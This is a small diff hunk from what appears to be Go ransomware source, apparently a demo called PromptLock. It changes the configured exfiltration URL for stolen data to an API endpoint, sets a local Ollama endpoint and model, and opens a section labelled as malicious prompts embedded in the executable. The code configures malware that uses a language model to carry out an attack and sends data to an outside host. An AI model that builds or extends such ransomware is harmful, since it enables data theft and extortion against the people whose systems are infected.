@@ -15,7 +15,7 @@ import (
 var config = map[string]string{
 	"ollama_endpoint": "http://localhost:11434/api/generate",
 	"model_name":      "llama3.2:1b",
-	"exfiltration_url": "https://promptlock-ransomware-demo.vercel.app/exfiltrate.html",
+	"exfiltration_url": "https://promptlock-ransomware-demo.vercel.app/api/exfiltrate",
 }
 
 // Malicious prompts embedded in the executable
